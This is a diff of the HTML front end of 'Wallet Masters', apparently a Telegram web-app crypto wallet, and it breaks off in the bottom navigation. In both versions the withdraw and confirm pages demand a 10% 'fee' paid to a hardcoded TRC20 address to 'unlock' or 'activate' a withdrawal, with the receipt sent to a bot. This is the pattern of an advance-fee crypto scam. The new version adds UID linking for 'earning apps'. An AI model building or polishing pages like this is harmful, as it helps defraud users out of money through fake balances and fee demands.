@@ -1,388 +1,408 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
   <title>Wallet Masters</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css" />
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
 
-<!-- SPLASH -->
+<!-- ── SPLASH SCREEN ── -->
 <div id="splash" class="splash">
   <div class="splash-inner">
-    <div class="splash-logo-wrap">
-      <svg width="72" height="72" viewBox="0 0 72 72" fill="none">
-        <circle cx="36" cy="36" r="36" fill="url(#g1)"/>
-        <path d="M22 36C22 28.268 28.268 22 36 22C43.732 22 50 28.268 50 36C50 43.732 43.732 50 36 50C28.268 50 22 43.732 22 36Z" fill="rgba(255,255,255,0.1)"/>
-        <path d="M36 26L40.5 33H31.5L36 26Z" fill="white"/>
-        <rect x="30" y="35" width="12" height="2" rx="1" fill="white"/>
-        <rect x="30" y="39" width="9" height="2" rx="1" fill="rgba(255,255,255,0.6)"/>
-        <rect x="30" y="43" width="6" height="2" rx="1" fill="rgba(255,255,255,0.3)"/>
-        <defs>
-          <linearGradient id="g1" x1="0" y1="0" x2="72" y2="72">
-            <stop offset="0%" stop-color="#6366f1"/>
-            <stop offset="100%" stop-color="#06b6d4"/>
-          </linearGradient>
-        </defs>
-      </svg>
-    </div>
-    <div class="splash-title">Wallet Masters</div>
-    <div class="splash-sub">Secure · Instant · Professional</div>
-    <div class="splash-dots"><span></span><span></span><span></span></div>
+    <div class="splash-logo">💎</div>
+    <h1 class="splash-title">Wallet Masters</h1>
+    <p class="splash-sub">Secure · Fast · Advanced</p>
+    <div class="splash-loader"><span></span><span></span><span></span></div>
   </div>
 </div>
 
-<!-- APP -->
+<!-- ── MAIN APP ── -->
 <div id="app" class="app hidden">
 
-  <!-- TOP BAR -->
-  <header class="topbar">
-    <div class="topbar-user">
-      <div class="topbar-avatar" id="userAvatar">W</div>
-      <div class="topbar-info">
-        <div class="topbar-name" id="userName">Wallet Masters</div>
-        <div class="topbar-uid" id="userUID">Loading...</div>
+  <!-- Top Bar -->
+  <header class="top-bar">
+    <div class="top-bar-left">
+      <div class="avatar" id="userAvatar">👤</div>
+      <div>
+        <div class="user-name" id="userName">Loading...</div>
+        <div class="user-uid" id="userUID">UID: ---</div>
       </div>
     </div>
-    <div class="topbar-actions">
-      <button class="topbar-btn" onclick="showPage('notifications')">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
-      </button>
-      <button class="topbar-btn" onclick="showPage('settings')">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93l-1.41 1.41M4.93 4.93l1.41 1.41M4.93 19.07l1.41-1.41M19.07 19.07l-1.41-1.41M21 12h-2M5 12H3M12 21v-2M12 5V3"/></svg>
-      </button>
+    <div class="top-bar-right">
+      <button class="icon-btn" onclick="showPage('notifications')">🔔</button>
+      <button class="icon-btn" onclick="showPage('settings')">⚙️</button>
     </div>
   </header>
 
-  <!-- PAGES CONTAINER -->
+  <!-- Pages -->
   <div id="pages">
 
-    <!-- ══ HOME ══ -->
+    <!-- ═══ HOME PAGE ═══ -->
     <div class="page active" id="page-home">
-
-      <!-- Balance Hero Card -->
-      <div class="hero-card">
-        <div class="hero-card-bg"></div>
-        <div class="hero-top">
-          <span class="hero-label">Total Portfolio Value</span>
-          <div class="hero-eye" onclick="toggleBalanceVisibility()">
-            <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-          </div>
-        </div>
-        <div class="hero-balance">
+      <!-- Balance Card -->
+      <div class="balance-card">
+        <div class="balance-label">Total Balance</div>
+        <div class="balance-amount">
           <span id="balanceAmount">0.00</span>
-          <span class="hero-currency">USDT</span>
+          <span class="balance-currency">USDT</span>
         </div>
-        <div class="hero-usd">≈ $<span id="balanceUSD">0.00</span> USD</div>
-        <div class="hero-address-row">
-          <div class="hero-address-inner">
-            <span class="hero-addr-label">TRC20</span>
-            <span class="hero-addr-text" id="trc20Address">Loading...</span>
+        <div class="balance-sub">≈ $<span id="balanceUSD">0.00</span> USD</div>
+        <div class="balance-address">
+          <span class="addr-label">TRC20 Address</span>
+          <div class="addr-row">
+            <span class="addr-text" id="trc20Address">Loading...</span>
+            <button class="copy-btn" onclick="copyAddress()">📋</button>
           </div>
-          <button class="hero-copy-btn" onclick="copyAddress()">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-            Copy
-          </button>
         </div>
       </div>
 
       <!-- Quick Actions -->
-      <div class="quick-grid">
-        <button class="quick-btn" onclick="showPage('receive')">
-          <div class="quick-icon recv-icon">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>
-          </div>
+      <div class="quick-actions">
+        <button class="action-btn" onclick="showPage('receive')">
+          <span class="action-icon">⬇️</span>
           <span>Receive</span>
         </button>
-        <button class="quick-btn" onclick="showPage('withdraw')">
-          <div class="quick-icon send-icon">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
-          </div>
-          <span>Send</span>
+        <button class="action-btn primary" onclick="showPage('withdraw')">
+          <span class="action-icon">⬆️</span>
+          <span>Withdraw</span>
         </button>
-        <button class="quick-btn" onclick="showPage('connect')">
-          <div class="quick-icon link-icon">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-          </div>
+        <button class="action-btn" onclick="showPage('connect')">
+          <span class="action-icon">🔗</span>
           <span>Connect</span>
         </button>
-        <button class="quick-btn" onclick="showPage('history')">
-          <div class="quick-icon hist-icon">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
-          </div>
-          <span>History</span>
+        <button class="action-btn" onclick="showPage('swap')">
+          <span class="action-icon">🔄</span>
+          <span>Swap</span>
         </button>
       </div>
 
       <!-- Portfolio -->
-      <div class="section-header">
-        <span class="section-title">My Assets</span>
-      </div>
-      <div class="asset-list">
-        <div class="asset-row">
-          <div class="asset-icon-wrap" style="background:linear-gradient(135deg,#26a17b,#1a7a5c)">
-            <span style="color:white;font-weight:800;font-size:14px">₮</span>
+      <div class="section-title">My Portfolio</div>
+      <div class="token-list">
+        <div class="token-card">
+          <div class="token-left">
+            <div class="token-icon usdt-icon">₮</div>
+            <div>
+              <div class="token-name">Tether USD</div>
+              <div class="token-network">TRC20 · USDT</div>
+            </div>
           </div>
-          <div class="asset-info">
-            <div class="asset-name">Tether USD</div>
-            <div class="asset-tag">TRC20 · USDT</div>
-          </div>
-          <div class="asset-values">
-            <div class="asset-amount" id="usdtBalance">0.00 USDT</div>
-            <div class="asset-usd" id="usdtValue">$0.00</div>
+          <div class="token-right">
+            <div class="token-balance" id="usdtBalance">0.00</div>
+            <div class="token-value" id="usdtValue">$0.00</div>
           </div>
         </div>
-        <div class="asset-row">
-          <div class="asset-icon-wrap" style="background:linear-gradient(135deg,#ef4444,#b91c1c)">
-            <span style="color:white;font-weight:800;font-size:12px">TRX</span>
+        <div class="token-card">
+          <div class="token-left">
+            <div class="token-icon trx-icon">🔺</div>
+            <div>
+              <div class="token-name">TRON</div>
+              <div class="token-network">Native · TRX</div>
+            </div>
           </div>
-          <div class="asset-info">
-            <div class="asset-name">TRON</div>
-            <div class="asset-tag">Native · TRX</div>
-          </div>
-          <div class="asset-values">
-            <div class="asset-amount">0.00 TRX</div>
-            <div class="asset-usd">$0.00</div>
+          <div class="token-right">
+            <div class="token-balance">0.00</div>
+            <div class="token-value">$0.00</div>
           </div>
         </div>
       </div>
 
-      <!-- Recent Txns -->
-      <div class="section-header">
-        <span class="section-title">Recent Activity</span>
-        <button class="see-all-btn" onclick="showPage('history')">See All</button>
-      </div>
+      <!-- Recent Transactions -->
+      <div class="section-title">Recent Transactions</div>
       <div id="txList" class="tx-list">
-        <div class="empty-tx">
-          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#334155" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-          <p>No transactions yet</p>
-          <span>Your activity will appear here</span>
-        </div>
+        <div class="empty-state">No transactions yet</div>
       </div>
     </div>
 
-    <!-- ══ WITHDRAW ══ -->
+    <!-- ═══ WITHDRAW PAGE ═══ -->
     <div class="page" id="page-withdraw">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-        </button>
-        <h2>Send / Withdraw</h2>
+        <button class="back-btn" onclick="showPage('home')">←</button>
+        <h2>Withdraw</h2>
       </div>
-      <div class="form-body">
-        <div class="form-section">
-          <label class="form-label">Network</label>
-          <div class="net-tabs" id="networkSelector">
-            <button class="net-tab active" data-network="TRC20" onclick="selectNetwork(this)">
-              <span class="net-dot" style="background:#ef4444"></span>TRC20
-              <span class="net-fee-pill">Low Fee</span>
-            </button>
-            <button class="net-tab" data-network="ERC20" onclick="selectNetwork(this)">
-              <span class="net-dot" style="background:#627eea"></span>ERC20
-              <span class="net-fee-pill high">High Fee</span>
-            </button>
-            <button class="net-tab" data-network="BEP20" onclick="selectNetwork(this)">
-              <span class="net-dot" style="background:#f0b90b"></span>BEP20
-              <span class="net-fee-pill">Low Fee</span>
-            </button>
+
+      <div class="withdraw-container">
+        <!-- Network Selector -->
+        <div class="form-group">
+          <label>Select Network</label>
+          <div class="network-selector" id="networkSelector">
+            <div class="network-option active" data-network="TRC20" onclick="selectNetwork(this)">
+              <span class="net-icon">🔺</span>
+              <div>
+                <div class="net-name">TRC20</div>
+                <div class="net-sub">Tron Network</div>
+              </div>
+              <span class="net-fee-badge">Low Fee</span>
+            </div>
+            <div class="network-option" data-network="ERC20" onclick="selectNetwork(this)">
+              <span class="net-icon">⟠</span>
+              <div>
+                <div class="net-name">ERC20</div>
+                <div class="net-sub">Ethereum Network</div>
+              </div>
+              <span class="net-fee-badge high">Higher Fee</span>
+            </div>
+            <div class="network-option" data-network="BEP20" onclick="selectNetwork(this)">
+              <span class="net-icon">🔶</span>
+              <div>
+                <div class="net-name">BEP20</div>
+                <div class="net-sub">BSC Network</div>
+              </div>
+              <span class="net-fee-badge">Low Fee</span>
+            </div>
           </div>
         </div>
-        <div class="form-section">
-          <label class="form-label">Recipient Address</label>
-          <div class="input-row">
-            <input class="form-input" type="text" id="withdrawAddress" placeholder="Paste wallet address..." oninput="validateWithdrawForm()"/>
-            <button class="input-side-btn" onclick="pasteAddress()">Paste</button>
+
+        <!-- To Address -->
+        <div class="form-group">
+          <label>Recipient Address</label>
+          <div class="input-with-scan">
+            <input type="text" id="withdrawAddress" placeholder="Enter wallet address..." 
+                   oninput="validateWithdrawForm()" />
+            <button class="scan-btn" onclick="pasteAddress()">📋 Paste</button>
           </div>
-          <div class="input-error hidden" id="addrWarning">Invalid address format</div>
+          <div class="addr-warning hidden" id="addrWarning">⚠️ Invalid address format</div>
         </div>
-        <div class="form-section">
-          <div class="label-row">
-            <label class="form-label">Amount</label>
-            <span class="form-balance">Balance: <b id="availBalance">0.00</b> USDT</span>
+
+        <!-- Amount -->
+        <div class="form-group">
+          <label>Amount <span class="available-label">Available: <b id="availBalance">0.00</b> USDT</span></label>
+          <div class="amount-input-wrap">
+            <input type="number" id="withdrawAmount" placeholder="0.00" step="0.01" min="1"
+                   oninput="updateWithdrawFees()" />
+            <div class="amount-currency">USDT</div>
           </div>
-          <div class="amount-box">
-            <input class="amount-input" type="number" id="withdrawAmount" placeholder="0.00" oninput="updateWithdrawFees()"/>
-            <span class="amount-badge">USDT</span>
-          </div>
-          <div class="pct-row">
-            <button class="pct-btn" onclick="setPercent(25)">25%</button>
-            <button class="pct-btn" onclick="setPercent(50)">50%</button>
-            <button class="pct-btn" onclick="setPercent(75)">75%</button>
-            <button class="pct-btn" onclick="setPercent(100)">MAX</button>
+          <div class="amount-presets">
+            <button onclick="setPercent(25)">25%</button>
+            <button onclick="setPercent(50)">50%</button>
+            <button onclick="setPercent(75)">75%</button>
+            <button onclick="setPercent(100)">MAX</button>
           </div>
         </div>
-        <div class="fee-card" id="feeBreakdown">
-          <div class="fee-card-title">Transaction Summary</div>
-          <div class="fee-line"><span>Amount</span><span id="feeAmt">0.00 USDT</span></div>
-          <div class="fee-line"><span>Network Fee</span><span id="gasFee" class="fee-num">0.00 USDT</span></div>
-          <div class="fee-line"><span>Processing Fee</span><span id="gatewayFee" class="fee-num">0.00 USDT</span></div>
-          <div class="fee-divider"></div>
-          <div class="fee-line total"><span>Total Fees</span><span id="totalFee" class="fee-total-num">0.00 USDT</span></div>
-          <div class="fee-notice">10% fee applies · Pay fee to receive funds</div>
+
+        <!-- Fee Breakdown -->
+        <div class="fee-breakdown" id="feeBreakdown">
+          <div class="fee-title">⚡ Transaction Details</div>
+          <div class="fee-row">
+            <span>Withdrawal Amount</span>
+            <span id="feeAmt">0.00 USDT</span>
+          </div>
+          <div class="fee-row">
+            <span>⛽ Gas Fee (Network)</span>
+            <span id="gasFee" class="fee-val">0.00 USDT</span>
+          </div>
+          <div class="fee-row">
+            <span>🏦 Gateway Processing Fee</span>
+            <span id="gatewayFee" class="fee-val">0.00 USDT</span>
+          </div>
+          <div class="fee-row total">
+            <span>💸 Total Fees</span>
+            <span id="totalFee" class="fee-total">0.00 USDT</span>
+          </div>
+          <div class="fee-note">
+            Fees are calculated at 10% of withdrawal amount.<br/>
+            Send fee to: <b>TRC20</b>
+          </div>
         </div>
-        <div class="warn-box">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
-          Always double-check the recipient address. Transactions are irreversible.
+
+        <!-- Warning -->
+        <div class="withdraw-warning">
+          ⚠️ Double-check the recipient address. Transactions cannot be reversed.
         </div>
-        <button class="primary-btn" id="withdrawBtn" onclick="submitWithdrawal()" disabled>Continue →</button>
+
+        <button class="submit-btn" id="withdrawBtn" onclick="submitWithdrawal()" disabled>
+          <span>Continue to Pay Fee</span>
+        </button>
       </div>
     </div>
 
-    <!-- ══ CONFIRM ══ -->
+    <!-- ═══ WITHDRAWAL CONFIRMATION PAGE ═══ -->
     <div class="page" id="page-confirm">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('withdraw')">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-        </button>
-        <h2>Confirm Transaction</h2>
+        <button class="back-btn" onclick="showPage('withdraw')">←</button>
+        <h2>Confirm Withdrawal</h2>
       </div>
-      <div class="form-body">
-        <div class="confirm-icon-wrap">
-          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+
+      <div class="confirm-container">
+        <div class="confirm-icon">🔐</div>
+        <div class="confirm-title">Review Transaction</div>
+
+        <div class="confirm-card" id="confirmDetails">
+          <!-- Filled dynamically -->
         </div>
-        <div class="confirm-card" id="confirmDetails"></div>
-        <div class="fee-payment-card">
-          <div class="fpc-title">Fee Payment Required</div>
-          <div class="fpc-desc">Send <strong id="confirmTotalFee">0 USDT</strong> to unlock your withdrawal:</div>
-          <div class="fpc-address-box">
-            <div class="fpc-label">TRC20 Fee Address</div>
-            <div class="fpc-addr" id="feeAddressDisplay">TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ</div>
-            <button class="copy-full-btn" onclick="copyFeeAddress()">Copy Address</button>
+
+        <div class="fee-payment-section">
+          <div class="fee-payment-title">💳 Fee Payment</div>
+          <div class="fee-payment-desc">
+            Send <strong id="confirmTotalFee">0 USDT</strong> to the address below to activate your withdrawal:
           </div>
-          <div class="fpc-note">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#06b6d4" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-            After paying, send your receipt screenshot to the bot
+          <div class="fee-address-box">
+            <div class="fee-addr-label">Fee Payment Address (TRC20)</div>
+            <div class="fee-addr-value" id="feeAddressDisplay">TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ</div>
+            <button class="copy-btn full" onclick="copyFeeAddress()">📋 Copy Address</button>
           </div>
-          <button class="secondary-btn" onclick="openBotForReceipt()">Open Bot to Submit Receipt</button>
+          <div class="receipt-upload">
+            <div class="upload-label">📸 Upload Payment Receipt</div>
+            <div class="upload-desc">After paying the fee, send your payment screenshot to the bot chat</div>
+            <button class="upload-btn" onclick="openBotForReceipt()">
+              📤 Open Bot to Upload Receipt
+            </button>
+          </div>
         </div>
       </div>
     </div>
 
-    <!-- ══ RECEIVE ══ -->
+    <!-- ═══ RECEIVE PAGE ═══ -->
     <div class="page" id="page-receive">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-        </button>
-        <h2>Receive</h2>
+        <button class="back-btn" onclick="showPage('home')">←</button>
+        <h2>Receive USDT</h2>
       </div>
-      <div class="form-body centered">
-        <div class="qr-wrap">
-          <div id="qrCode" class="qr-placeholder">
-            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#334155" stroke-width="1"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="3" height="3"/><rect x="19" y="14" width="2" height="2"/><rect x="14" y="19" width="2" height="2"/><rect x="18" y="18" width="3" height="3"/></svg>
-            <span>QR Code</span>
+
+      <div class="receive-container">
+        <div class="receive-network-tabs">
+          <button class="net-tab active">TRC20</button>
+          <button class="net-tab" onclick="showToast('ERC20 address coming soon')">ERC20</button>
+          <button class="net-tab" onclick="showToast('BEP20 address coming soon')">BEP20</button>
+        </div>
+
+        <div class="qr-container">
+          <div class="qr-placeholder" id="qrCode">
+            <canvas id="qrCanvas"></canvas>
+          </div>
+          <div class="qr-label">Scan to receive USDT</div>
+        </div>
+
+        <div class="receive-address-box">
+          <div class="recv-addr-label">Your TRC20 Address</div>
+          <div class="recv-addr" id="receiveAddress">Loading...</div>
+          <div class="recv-actions">
+            <button onclick="copyAddress()">📋 Copy</button>
+            <button onclick="shareAddress()">📤 Share</button>
           </div>
         </div>
-        <div class="receive-network-label">TRC20 · USDT</div>
-        <div class="receive-addr-box">
-          <div class="receive-addr" id="receiveAddress">Loading...</div>
-          <button class="copy-full-btn" onclick="copyAddress()">Copy Address</button>
+
+        <div class="receive-note">
+          ⚠️ Only send USDT (TRC20) to this address. Sending other tokens may result in permanent loss.
         </div>
-        <div class="receive-note">Only send USDT (TRC20) to this address. Sending other assets may result in permanent loss.</div>
+
+        <div class="uid-section">
+          <div class="uid-title">🆔 Your Wallet UID</div>
+          <div class="uid-value" id="receiveUID">---</div>
+          <div class="uid-desc">Use this UID to receive payments from connected Earning Apps</div>
+          <button class="copy-btn full" onclick="copyUID()">📋 Copy UID</button>
+        </div>
       </div>
     </div>
 
-    <!-- ══ CONNECT APP ══ -->
+    <!-- ═══ CONNECT EARNING APP PAGE ═══ -->
     <div class="page" id="page-connect">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-        </button>
+        <button class="back-btn" onclick="showPage('home')">←</button>
         <h2>Connect Earning App</h2>
       </div>
-      <div class="form-body">
-        <div class="connect-hero">
-          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.5"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-          <p>Connect your earning apps to receive instant withdrawals into your Wallet Masters balance.</p>
+
+      <div class="connect-container">
+        <div class="connect-intro">
+          🔗 Connect your UID from verified Earning Apps to receive instant payments to your wallet.
         </div>
-        <div id="appsList" class="apps-list">
-          <div class="loading-apps">Loading available apps...</div>
+
+        <div class="connected-title">✅ Connected Apps</div>
+        <div id="connectedApps" class="connected-list">
+          <div class="empty-state">No apps connected yet</div>
+        </div>
+
+        <div class="available-title">📱 Available Earning Apps</div>
+        <div id="earningAppsList" class="apps-list">
+          <div class="empty-state">Loading...</div>
         </div>
       </div>
     </div>
 
-    <!-- ══ HISTORY ══ -->
-    <div class="page" id="page-history">
+    <!-- ═══ CONNECT UID MODAL ═══ -->
+    <div class="modal hidden" id="uidModal">
+      <div class="modal-backdrop" onclick="closeModal('uidModal')"></div>
+      <div class="modal-content">
+        <div class="modal-title">🔗 Connect <span id="modalAppName">App</span></div>
+        <div class="modal-desc">Enter your Unique UID from this earning app to link your wallet.</div>
+        <input type="text" id="uidInput" placeholder="Enter your UID..." />
+        <div class="uid-error hidden" id="uidError">❌ Invalid UID. Please check and try again.</div>
+        <div class="modal-actions">
+          <button class="modal-cancel" onclick="closeModal('uidModal')">Cancel</button>
+          <button class="modal-confirm" onclick="submitUID()">Connect</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ TRANSACTIONS PAGE ═══ -->
+    <div class="page" id="page-transactions">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-        </button>
-        <h2>Transaction History</h2>
+        <button class="back-btn" onclick="showPage('home')">←</button>
+        <h2>All Transactions</h2>
       </div>
-      <div id="historyList" class="tx-list" style="padding:0 16px 80px"></div>
+      <div id="allTxList" class="tx-list padded">
+        <div class="empty-state">No transactions</div>
+      </div>
     </div>
 
-    <!-- ══ SETTINGS ══ -->
+    <!-- ═══ SETTINGS PAGE ═══ -->
     <div class="page" id="page-settings">
       <div class="page-header">
-        <button class="back-btn" onclick="showPage('home')">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-        </button>
+        <button class="back-btn" onclick="showPage('home')">←</button>
         <h2>Settings</h2>
       </div>
-      <div class="form-body">
-        <div class="settings-list">
-          <div class="settings-row" onclick="showPage('connect')">
-            <div class="settings-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></div>
-            <div class="settings-text"><div class="settings-label">Connected Apps</div><div class="settings-sub">Manage earning app connections</div></div>
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
-          </div>
-          <div class="settings-row">
-            <div class="settings-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
-            <div class="settings-text"><div class="settings-label">Security</div><div class="settings-sub">PIN & biometrics</div></div>
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
-          </div>
-          <div class="settings-row">
-            <div class="settings-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93l-1.41 1.41M4.93 4.93l1.41 1.41M4.93 19.07l1.41-1.41M19.07 19.07l-1.41-1.41M21 12h-2M5 12H3M12 21v-2M12 5V3"/></svg></div>
-            <div class="settings-text"><div class="settings-label">Preferences</div><div class="settings-sub">Currency & notifications</div></div>
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
-          </div>
-          <div class="settings-row">
-            <div class="settings-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div>
-            <div class="settings-text"><div class="settings-label">About</div><div class="settings-sub">Version 1.0.0</div></div>
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
-          </div>
+      <div class="settings-list">
+        <div class="settings-item" onclick="showPage('receive')">
+          <span>📬 My Addresses</span>
+          <span>›</span>
+        </div>
+        <div class="settings-item" onclick="showPage('connect')">
+          <span>🔗 Connected Apps</span>
+          <span>›</span>
+        </div>
+        <div class="settings-item" onclick="showPage('transactions')">
+          <span>📋 Transaction History</span>
+          <span>›</span>
+        </div>
+        <div class="settings-item">
+          <span>🔒 Security</span>
+          <span>›</span>
+        </div>
+        <div class="settings-item" onclick="copyUID()">
+          <span>🆔 Copy Wallet UID</span>
+          <span>›</span>
         </div>
       </div>
+      <div class="version-tag">Wallet Masters v1.0 · Secure Crypto Wallet</div>
     </div>
 
-  </div><!-- /pages -->
+  </div>
 
-  <!-- BOTTOM NAV -->
+  <!-- Bottom Nav -->
   <nav class="bottom-nav">
-    <button class="nav-btn active" onclick="showPage('home'); setNav(this)">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-      <span>Home</span>
+    <button class="nav-btn active" onclick="showPage('home')" data-page="home">
+      <span>🏠</span><span>Home</span>
     </button>
-    <button class="nav-btn" onclick="showPage('history'); setNav(this)">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
-      <span>Activity</span>
+    <button class="nav-btn" onclick="showPage('transactions')" data-page="transactions">
+      <span>📋</span><span>History</span>
     </button>
-    <button class="nav-btn send-center-btn" onclick="showPage('withdraw')">
-      <div class="center-btn-inner">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
-      </div>
-      <span>Send</span>
+    <button class="nav-btn" onclick="showPage('connect')" data-page="connect">
+      <span>🔗</span><span>Apps</span>
     </button>
-    <button class="nav-btn" onclick="showPage('connect'); setNav(this)">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-      <span>Connect</span>
-    </button>
-    <button class="nav-btn" onclick="showPage('settings'); setNav(this)">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93l-1.41 1.41M4.93 4.93l1.41 1.41M4.93 19.07l1.41-1.41M19.07 19.07l-1.41-1.41M21 12h-2M5 12H3M12 21v-2M12 5V3"/></svg>
-      <span>Settings</span>
+    <button class="nav-btn" onclick="showPage('settings')" data-page="settings">
